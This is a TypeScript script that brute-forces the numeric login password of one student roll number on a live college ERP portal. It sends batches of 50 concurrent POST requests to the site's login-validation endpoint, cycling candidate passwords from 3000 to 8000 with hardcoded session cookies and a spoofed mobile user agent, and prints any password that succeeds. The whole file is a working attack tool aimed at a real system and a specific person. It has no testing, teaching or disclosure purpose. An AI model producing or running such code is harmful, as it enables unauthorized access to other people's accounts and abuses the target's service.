// imports
import axios from 'axios';
import qs from 'qs';
import cheerio from 'cheerio';
import 'dotenv/config'

// Declarations
interface RequestConfig {
    ROLLNUMBER: string | null;
    STARTINDEX: number;
    ENDINDEX: number;
    BATCH: number;
    readonly MAX_CONCURRENT_REQUESTS: number;
    HTMLCONTENT: string
    TXTPASSWORD: number,
    readonly VERIFYLINK: string
}

// Initialization
const REQ_OBJECT: RequestConfig = {
    ROLLNUMBER: '220909',
    STARTINDEX: 3000,
    ENDINDEX: 8000,
    BATCH: Number(process.env.BATCH) || 50,
    MAX_CONCURRENT_REQUESTS: 50,
    HTMLCONTENT: "",
    TXTPASSWORD: 0,
    VERIFYLINK: "https://app.sdmes.in/EERPV3.0/EAM/login.jsp?ConsID=SDMCOLL"
};

// Function Argument Types
type MainMethodArgs = Pick<RequestConfig, 'ROLLNUMBER' | 'STARTINDEX' | 'ENDINDEX' | 'BATCH' | 'VERIFYLINK'>
type processBatchMethodArgs = Pick<MainMethodArgs, 'ROLLNUMBER' | 'STARTINDEX' | 'ENDINDEX'>
type findPasswordMethodArgs = Pick<RequestConfig, 'ROLLNUMBER' | 'TXTPASSWORD'>
type parseHtmlMethodArgs = Pick<RequestConfig, 'HTMLCONTENT'>

// Solve Each Requests
async function findPassword({ ROLLNUMBER, TXTPASSWORD }: findPasswordMethodArgs) {
    const data = qs.stringify({
        'ConsID': 'SDMCOLL',
        'userName': ROLLNUMBER,
        'txtPwd': TXTPASSWORD,
        'LogTyp': '1',
        'flgS': '1'
    });

    const config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://app.sdmes.in/EERPV3.0/EAM/logValidate.jsp',
        headers: {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.8',
            'Connection': 'keep-alive',
            'Content-type': 'application/x-www-form-urlencoded',
            'Cookie': 'JSESSIONID=8DB871AE8B7FE2323E58463FD2F0E5AD; JSESSIONID=FBDA6862B299A34AF9CB15AB84795423',
            'Origin': 'https://app.sdmes.in',
            'Referer': 'https://app.sdmes.in/EERPV3.0/EAM/login.jsp?ConsID=SDMCOLL',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-GPC': '1',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
        },
        data: data
    };

    try {
        const response = await axios.request(config);
        return parseHtml({ HTMLCONTENT: response.data });
    } catch (error) {
        return null;
    }
}

// Parsing Responses
function parseHtml({ HTMLCONTENT }: parseHtmlMethodArgs) {
    const $ = cheerio.load(HTMLCONTENT);
    const parsedText = $('html').text();
    return parsedText.includes("ERROR") ? null : parsedText;
}

// Batch Requests
async function processBatch({ ROLLNUMBER, STARTINDEX, ENDINDEX }: processBatchMethodArgs) {
    const promises = [];

    for (let i = STARTINDEX; i <= ENDINDEX; i++) {
        const datapromise = findPassword({
            ROLLNUMBER,
            TXTPASSWORD: i
        }).then(result => ({ result, password: i }));
        promises.push(datapromise);

        if (promises.length >= REQ_OBJECT.MAX_CONCURRENT_REQUESTS) {
            console.log("-----------50 REQ------------");
            const responses = await Promise.all(promises);
            const found = responses.find(data => data.result !== null);

            if (found) {
                return found;
            }

            promises.length = 0;
        }
    }

    if (promises.length > 0) {
        const responses = await Promise.all(promises);
        return responses.find(data => data.result !== null);
    }

    return null;
}

// Main Method
async function main({ ROLLNUMBER, STARTINDEX, ENDINDEX, BATCH, VERIFYLINK }: MainMethodArgs) {

    if (ROLLNUMBER == '000000') {
        console.log("ADD ROLLNUMBER TO REQ_OBJECT line 17");
        return
    }

    for (let j = STARTINDEX; j <= ENDINDEX; j += BATCH) {
        console.log("Checking for:", j, "to", j + BATCH);

        const found = await processBatch(
            { ROLLNUMBER: ROLLNUMBER, STARTINDEX: j, ENDINDEX: j + BATCH }
        );

        if (found) {
            console.log(
                "ROLL NUMBER:", ROLLNUMBER,
                "\nPASSWORD:", found.password,
                "\nVERIFY HERE:", VERIFYLINK
            );
            process.exit(1);
        } else {
            console.log("No password match between", j, "to", j + BATCH);
        }
    }
}

// Main Method Call
main(
    {
        ROLLNUMBER: REQ_OBJECT.ROLLNUMBER,
        STARTINDEX: REQ_OBJECT.STARTINDEX,
        ENDINDEX: REQ_OBJECT.ENDINDEX,
        BATCH: REQ_OBJECT.BATCH,
        VERIFYLINK: REQ_OBJECT.VERIFYLINK
    }
);